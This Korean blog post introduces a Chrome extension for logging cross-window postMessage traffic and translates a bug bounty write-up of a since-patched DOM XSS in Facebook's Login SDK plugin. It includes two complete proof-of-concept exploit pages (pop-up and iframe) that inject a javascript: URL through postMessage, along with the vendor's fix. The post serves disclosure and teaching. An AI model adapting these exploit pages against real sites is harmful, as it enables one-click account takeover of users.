---
layout: post
title:  "iframe broker & Story of Facebook DOM XSS"
author: "jeong.su"
comments: true
tags: [web]
---


> **2020.05**
라온화이트햇 핵심연구팀 최정수
jeon95u@gmail.com

이 글은 [Vinoth Kumar](https://vinothkumar.me/)가 지난 4월 Facebook의 DOM XSS를 발견하여 제보하고 2만 달러의 포상금을 받은 [게시글](https://vinothkumar.me/20000-facebook-dom-xss/)을 번역한 내용이 포함되어 있습니다. 추가로 해당 취약점을 찾기 위해 [Vinoth Kumar](https://vinothkumar.me/)가 개발한 Iframe과 Cross Window communications 로그를 쉽게 확인 할 수 있는 크롬 익스텐션을 사용하고 어떻게 적용할 수 있을지 고민했습니다.

---

# iframe broker

---

iframe broker는  [Vinoth Kumar](https://vinothkumar.me/)가 Cross Window Communication 로그를 쉽게 확인하기 위해서 작성한 Chrome Extension 입니다.

해당 도구의 간단한 원리는 message를 후킹하여 보여주는 방식입니다

Javascript는 아래와 같이 간단한 스크립트로 후킹할 수 있습니다.

```jsx
var origin_parse = window.JSON.parse;

window.JSON.parse = function(arg){
/* Something Do It! */
/* ex) console.log(arg) */
return origin_parse(arg);
}
```

iframe broker의 사용법은 아래와 같습니다.

```bash
git clone https://github.com/vinothsparrow/iframe-broker
```

우선 git clone 명령어를 통해 특정 폴더에 iframe-broker를 받아줍니다.

![/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png](/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png)

Chrome Extension 추가를 위해 개발자 모드 옵션을 활성화 시켜줍니다. 해당 옵션을 활성화 시켜주게되면 `압축해제된 확장 프로그램을 로드합니다.` 버튼이 생기며 클릭을 통해 clone 해준 iframe-broker 폴더를 선택해줍니다.

![/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png](/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png)

Iframe Broker가 정상적으로 로드된 것을 확인 할 수 있습니다.

![/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png](/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png)

위와 같이 Chrome Extension을 통해 Domain간 통신하는 메세지를 쉽게 확인 할 수 있으며 클라이언트 사이드의 취약점을 찾는데 편리한 도구라는 생각이듭니다. 아래는 해당 Chrome Extension 개발자가 개발 후 Extension을 사용하면서 직접 취약점을 찾은 내용을 번역했습니다.

# Story of [$20000 Facebook DOM XSS](https://vinothkumar.me/20000-facebook-dom-xss/)

---

> window.postMessage() method를 사용하면 생성 된 페이지와 팝업 사이 또는 페이지와 페이지에 포함된 iframe 사이와 같은 Window 객체 간의 cross-origin 통신을 안전하게 할 수 있습니다. - [Mozilla postMessage Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

postMessage 및 도메인 간 통신에 대해 더 알고 싶다면 아래 문서를 읽는 것이 좋습니다.

- [How cross window/frame communication happens in Javascript](https://javascript.info/cross-window-communication)
- [https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/](https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/)
- [https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/](https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/)

## Background

> postMessage를 통한 DOM XSS는 과소 평가 된 취약점이며 많은 버그바운티 헌터들에게는 눈에 띄지 않는 취약점입니다.

최근에 open dashboards 및 credentials 취약점을 찾는 대신 클라이언트 쪽 취약점을 찾기 시작했습니다.

([HackerOne에 리포트된 보고서](https://hackerone.com/vinothkumar)를 본다면 대부분 나의 리포트는 open dashboard 또는 Github credential leak 입니다.) 

처음에는 XSSI, JSONP 및 postMessage 관련 된 보안 문제를 찾기 시작했습니다. 그러나 XSSI 및 JSONP 취약점은 매우 드물며 [SameSite 쿠키](https://blog.reconless.com/samesite-by-default/)가 도입 된 이후 이 취약점은 사라질 것입니다. 따라서 postMessage 취약점을 살펴 보는 데 집중했습니다. postMessage 취약점은 주로 보안 연구원이 대부분 무시하지만 디버깅이 쉽고 방화벽을 우회 할 필요가 없습니다.

또한 디버깅을 더 쉽게하기 위해 페이지에서 발생하는 cross window communication의 view/log를 위한 [Chrome extension을 개발](https://github.com/vinothsparrow/iframe-broker) 했습니다.

일반적으로 웹 사이트는 위젯, 플러그인 또는 웹 SDK에서 iframe 통신을 사용합니다. 따라서 페이스북의 iframe 보안 문제를 찾으려고 시작하자마자 [https://developers.facebook.com](https://developers.facebook.com/)으로 이동하여 Facebook의 third-party 플러그인을 보기 시작했습니다.

그리고 cross-domain 통신을 위해서 `Facebook Login SDK for JavaScript`는 `v6.0/plugins/login_button.php`에서 proxy iframe을 만들며 proxy frame에서는 `Continue with Facebook` 버튼을 렌더링 해줍니다. 여기서 흥미로운 점은 javascript SDK가 proxy frame에 버튼의 클릭 URL이 포함 된 초기화 페이로드를 전송 한다는 것입니다.

로그인 SDK의 흐름은 아래와 같습니다.

```jsx
Third-Party website + (Facebook Login SDK for JavaScript)
```

↓

```jsx
<iframe src='https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&button_type=continue_with&channel=REDIRECT_URL&sdk=joey'>
</iframe>
```

↓

```jsx
// Facebook Javascript SDK는 초기화 payload를 iframe proxy에게 보냅니다.
iframe.contentWindow.postMessage({"xdArbiterHandleMessage":true,"message":{"method":"loginButtonStateInit","params":JSON.stringify({'call':{'id':'INT_ID',
'url':'https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID&SOME_OTHER_PARAMS',
'size':{'width':10,'height':10},'dims':{'screenX':0,'screenY':23,'outerWidth':1680,'outerHeight':971'screenWidth':1680}}})},"origin":"APP_DOMAIN"}, '*')
```

↓

```jsx
// 유저가 Login with Facebook 버튼을 클릭하면 proxy iframe에서 특정 URL을 open 합니다.
window.open('https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID')
```

↓

```jsx
// 팝업 윈도우는 accesstoken과 signed-request를 third-party website에게 postMessage를 사용하여 보냅니다.
window.opener.parent.postMessage(result, origin)
```

해당 초기화 payload를 주의 깊게 살펴보면 SDK가 Facebook 플러그인 iframe으로 전송합니다. url 파라미터는 i라는 변수에 저장 되며 버튼이 클릭 되어 이벤트가 트리거 될 때 아래 함수가 실행됩니다.

![/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png](/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png)

```jsx
i.url = i.url.replace(/cbt=\d+/, "cbt=" + a);
a = window.open(i.url, i.id, b("buildPopupFeatureString")(i));
```

위 Javascript 코드를 보았을 때 나는 "무언가 왔구나! 취약점이 내게 왔구나! 😉"를 느꼈습니다.

왜냐하면 Javascript 코드에는 URL/Scheme 유효성 검사가 존재하지 않았습니다. 따라서 아래와 같이 DOM XSS를 할 수 있었습니다.

`window.open('javascript:alert(document.domain)')`

그래서 우리가 `url:'javascript:alert(document.domain)'`와 같은 페이로드를 보내는 경우 받는 사람은 iframe이 [`https://www.facebook.com/v6.0/plugins/login_button.php`](https://www.facebook.com/v6.0/plugins/login_button.php)를 방문하고 사용자가 `Continue With Facebook`버튼을 클릭하게 되면  [facebook.com](http://facebook.com/) 도메인에서 `javascript:alert(document.domain)`와 같은 Javascript가 실행됩니다. 

## Exploiting the Iframe

위 보안 이슈를 통해 익스플로잇 하는 방법은 2가지가 있습니다.

### 1. Pop-up Method

```jsx
<script>   
   var opener = window.open("https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&auto_logout_link=false&button_type=continue_with&channel=REDIRECT_URL&container_width=734&locale=en_US&sdk=joey&size=large&use_continue_as=true","opener", "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1");
   
   setTimeout(function(){
        var message = {"xdArbiterHandleMessage":true,"message":{"method":"loginButtonStateInit","params":JSON.stringify({'call':{'id':'123','url':'javascript:alert(document.domain);','size':{'width':10,'height':10},'dims':{'screenX':0,'screenY':23,'outerWidth':1680,'outerHeight':971,'screenWidth':1680}}})},"origin":"ORIGIN"};
        opener.postMessage(message, '*');
    },'4000');
</script>
```

### 2. Iframe Method

`X-Frame-Options` 또는 CSP `frame-ancestors` 헤더가 누락 되었으므로 이 페이지는 공격자의 페이지에 쉽게 포함될 수 있습니다.

```jsx
<script>
function fbFrameLoaded() {
  var iframeEl = document.getElementById('fbframe');
  var message = {"xdArbiterHandleMessage":true,"message":{"method":"loginButtonStateInit","params":JSON.stringify({'call':{'id':'123','url':'javascript:alert(document.domain);','size':{'width':10,'height':10},'dims':{'screenX':0,'screenY':23,'outerWidth':1680,'outerHeight':971,'screenWidth':1680}}})},"origin":"ORIGIN"};
  iframeEl.contentWindow.postMessage(message, '*');
};
</script>
<iframe id="fbframe" src="https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&auto_logout_link=false&button_type=continue_with&channel=REDIRECT_URL&container_width=734&locale=en_US&sdk=joey&size=large&use_continue_as=true" onload="fbFrameLoaded(this)"></iframe>
```

## Fix

Facebook은 `url` 파라미터에 정규식 검사를 추가하여 domain과 schema가 존재하는지 확인하는 방법으로 패치했습니다.

```jsx
d = b("isFacebookURI")(new (g || (g = b("URI")))(c.call.url)),
j = c.call;
d || (j.url = b("XOAuthErrorController").getURIBuilder().setEnum("error_code", "PLATFORM__INVALID_URL").getURI().toString())
```

## Proof of Concept

[https://youtu.be/KAnuFy2F7QA](https://youtu.be/KAnuFy2F7QA)

## Impact

잘못된 post message 설정 때문에 누군가는 공격자의 웹세이트에 접속하고 페이스북으로 로그인하기 버튼을 클

릭함으로써 [facebook.com](http://facebook.com) 도메인에 XSS가 발생하고 **한 번의 클릭 만으로 계정을 탈취** 할 수 있습니다.